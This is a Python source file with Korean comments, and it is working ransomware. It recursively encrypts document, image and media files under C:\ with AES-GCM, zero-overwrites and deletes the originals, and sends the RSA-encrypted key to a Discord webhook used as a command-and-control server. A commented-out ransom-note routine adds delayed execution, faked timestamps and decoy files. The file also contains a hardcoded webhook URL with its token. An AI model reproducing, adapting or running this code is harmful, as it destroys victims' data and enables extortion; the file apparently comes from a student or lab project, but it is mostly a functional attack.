from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes 
from cryptography.hazmat.primitives.ciphers.aead import AESGCM  # AES-GCM 암호화 알고리즘 사용
from encrypt import encrypt_file_with_random_key
import requests
import secrets  # 난수 생성 모듈
import base64
import os

# C2 서버로 문자열 데이터를 전송하고 성공 여부를 반환하는 함수 - 동현
def send_to_c2server(data: str) -> bool:
    """
    C2 서버로 문자열 데이터를 전송하고 성공 여부를 반환하는 함수.

    매개변수:
    data (str): C2 서버로 전송할 문자열 데이터.

    반환값:
    bool: 전송이 성공하면 True, 실패하면 False를 반환.
    """
    # C2 서버 역할을 하는 Discord Webhook URL
    webhook_url = "https://discord.com/api/webhooks/1313875651220082710/RV3tyN3A4h6sxxepIYgc8FoyXc3dROpZJQGYtXlDdZqytgT8hcpnYLBf4RqoKdLMOvym"
    
    # Webhook에 전송할 데이터
    payload = {
        "content": data
    }

    try:
        # 요청 전송
        response = requests.post(webhook_url, json=payload)

        # 성공 여부 확인
        if response.status_code == 204:
            return True
        else:
            print(f"Failed to send message. HTTP status code: {response.status_code}")
            print(f"Response: {response.text}")
            return False
    except requests.RequestException as e:
        # 요청 중 에러 발생 시 False 반환
        print(f"Error occurred: {e}")
        return False

# AES 키를 RSA 공개키로 암호화한 뒤 base64로 인코딩한 후 서버로 전송하는 함수
def encrypt_and_send_aes_key(aes_key):
    """
    AES 키를 RSA 공개키로 암호화한 뒤 서버로 전송

    :param aes_key: AES 키 (바이트 데이터)
    :param server_url: AES 키를 보낼 서버의 URL
    :return: 서버 응답(Response 객체)
    """
    try:
        # RSA 공개키 (PEM 형식 하드코딩)
        rsa_public_key_pem = b"""
        -----BEGIN PUBLIC KEY-----
        MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnzQw8TQcWt/aEbp+tv/Y
        X39EjLQKuy9Q4OwxErIEFeLtZoHk8ivVWwlD26+SHr4as4FX/AuNQ+JwS4KtEDjU
        ax3M62+nUKX9zMd+G2AlYFtwJ2y/tFsb3Ikp6SkxSK7yfXBxWqa5KHr0Z1UBw5Oc
        CwmnRtqZoMq+Z3ZC2UxDL9k9LJmw2IOZm0+dEaY6NO53q06Rf+kBdSB0pB6+riIw
        H5WxNfPbLsUt3AoXRxnEwxgCwXoh97mJm0MNqg8KFCfnFsEjfvOAKZ8hZ+6GG/yA
        oUDHJrbYwFvg5EqD2d6r0pCf+AN3t9B0Og2tFMyzpRLCgR+xXz8gw3mXX5Nz6goE
        OwIDAQAB
        -----END PUBLIC KEY-----
        """

        # RSA 공개키 로드
        public_key = serialization.load_pem_public_key(rsa_public_key_pem)

        # AES 키 암호화
        encrypted_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # 서버로 암호화된 AES 키 Base64 인코딩 후 전송
        encoded_key = base64.b64encode(encrypted_key).decode("utf-8")
        return send_to_c2server(encoded_key)    

    except Exception as e:
        print(f"에러 발생: {e}")
        return None

# 파일을 AES 방식으로 암호화하는 함수.
def encrypt_file(filepath: str, key: bytes):
    """
    파일을 AES 방식으로 암호화하는 함수.
    - 암호화된 파일은 원본 경로에 ".enc" 확장자로 저장함.
    - 원본 파일은 덮어쓰기 후 삭제.
    
    Args:
        filepath (str): 암호화할 파일의 경로.
        key (bytes):암호화에 사용할 키.
    """
    try:
        # 파일 읽기 (바이너리 모드)
        with open(filepath, "rb") as f:
            plaintext = f.read()

        # AES-GCM 객체 생성
        aesgcm = AESGCM(key)

        # 12바이트 난수(Nonce) 생성
        nonce = secrets.token_bytes(12)

        # AES-GCM 암호화
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)

        # 암호화된 파일 저장 (nonce와 암호문 같이 저장. 복호화시 nonce분리 후 복호화)
        encrypted_filepath = filepath + ".enc"
        with open(encrypted_filepath, "wb") as f:
            f.write(nonce + ciphertext)

        print(f"파일 암호화 성공: {filepath} -> {encrypted_filepath}")

        # 원본 파일 덮어쓰기 후 삭제
        overwrite_and_delete_file(filepath)

    except Exception as e:
        print(f"암호화 실패: {filepath}. 에러: {e}")

# 파일 내용을 0으로 덮어쓰고 삭제하는 함수.
def overwrite_and_delete_file(filepath):
    """
    파일 내용을 0으로 덮어쓰고 삭제하는 함수.
    
    Args:
        filepath (str): 덮어쓰고 삭제할 파일의 경로.
    """
    try:
        with open(filepath, "wb") as f:
            f.write(b"\x00" * os.path.getsize(filepath))  # 파일 크기만큼 0으로 덮어쓰기
        os.remove(filepath)  # 파일 삭제
        print(f"원본 파일 삭제 완료: {filepath}")
    except Exception as e:
        print(f"파일 삭제 실패: {filepath}. 에러: {e}")

# 지정된 디렉토리 내 특정 확장자의 파일의 경로를 찾아서 암호화하는 함수.
def search_and_encrypt_directory():
    """
    지정된 디렉토리 내 특정 확장자의 파일을 암호화하는 함수.
    - target_extensions에 지정된 확장자의 파일만 암호화.
    - 암호화 과정에서 사용한 AES 키를 반환.

    Returns:
        bytes: AES 암호화 키.
    """
    directory = "C:\\"  # 하드코딩된 탐색 시작 디렉토리
    target_extensions = [
        ".pdf", ".docx", ".doc", ".txt", ".xls", ".xlsx",
        ".ppt", ".pptx", ".csv", ".jpeg", ".jpg", ".JPG",
        ".JPEG", ".png", ".PNG", ".mp4", ".mp3", ".mov"
    ]

    try:
        # 256비트(32바이트) 키 생성
        key = secrets.token_bytes(32)
        print("랜덤 AES 키 생성 완료.")

        # 디렉토리 순회
        for root, dirs, files in os.walk(directory):
            for file in files:
                # 특정 확장자 검사 및 암호화된 파일 제외
                if file.endswith(tuple(target_extensions)) and not file.endswith(".enc"):
                    file_path = os.path.join(root, file)
                    encrypt_file(file_path, key)  # 파일 암호화 수행

        print("파일 암호화 완료.")
        return key  # AES 키 반환

    except Exception as e:
        print(f"디렉토리 암호화 실패: {e}")
        return None

def main():
    try:
        aes_key = search_and_encrypt_directory() # 지정 경로 파일 암호화 함수 실행

        # 키 전송 성공 여부 출력
        if aes_key:
            success = encrypt_and_send_aes_key(aes_key) 
            if success:
                print("키가 성공적으로 전송되었습니다.")
            else:
                print("키 전송에 실패했습니다.")
        else:
            print("키 생성 또는 파일 암호화에 실패했습니다.")

    except Exception as e:
        print(f"메인 함수 실행 중 오류 발생: {e}")

"""
# 인우가 만든 랜섬노트 코드인데 이건 뭔가 추가적인 기능 느낌이라 일단 주석처리 해놨고, 나중에 좀 다른 방향으로 수정할 것 같음
from datetime import datetime, timezone, timedelta
import pytz
import time
import os
import random

def write_note(url):
    time.sleep(10)  #   파일 실행 후 코드가 실행되는 시간을 늦춤으로 혼란을 줌
    time_now = datetime.now(pytz.timezone('US/Eastern'))    #   미국 동부의 시간으로 시간 설정
    secret = int(time_now.timestamp() * 1e9)    #   나노초로 변환
    with open(url, "w") as file:
        file.write("Your files are encrypted!!\n")
    print(f"Randsome note created at {url}")

    os.utime(url, (secret, secret)) #   파일 생성 시간을 미국 동부 시간으로 설정(한국의 현재 시간과 다름)

    random.seed(secret) #   시간을 랜덤 시드로 줌
    secret_number = [0] * 5
    for i in range(5):
        secret_number[i] = random.randint(0, 101)   #   100이하의 랜덤한 정수 5개 생성

    add_path = "Readme"
    new_dir = os.path.join(url, add_path)   #   새로운 파일 경로 설정
    os.makedirs(new_dir, exist_ok = True)   #   새로운 파일 경로에 "Readme" 디렉토리 생성 (뭔가 중요해보이게끔)

    for i in range(random.randint(1000, 2001)):   # 2000개 이하의 랜덤한 수의 파일 생성
        with open(new_dir, "w") as file2: 
            num = random.randint(0, 5)
            file2.write(f"This is important thing {secret_num[num]}")   #   아무것도 아닌 숫자지만 뭔가 중요해보이게끔 적어놓음
        print(f"create fake file at {new_dir}")

    os.utime(new_dir, (secret, secret))
"""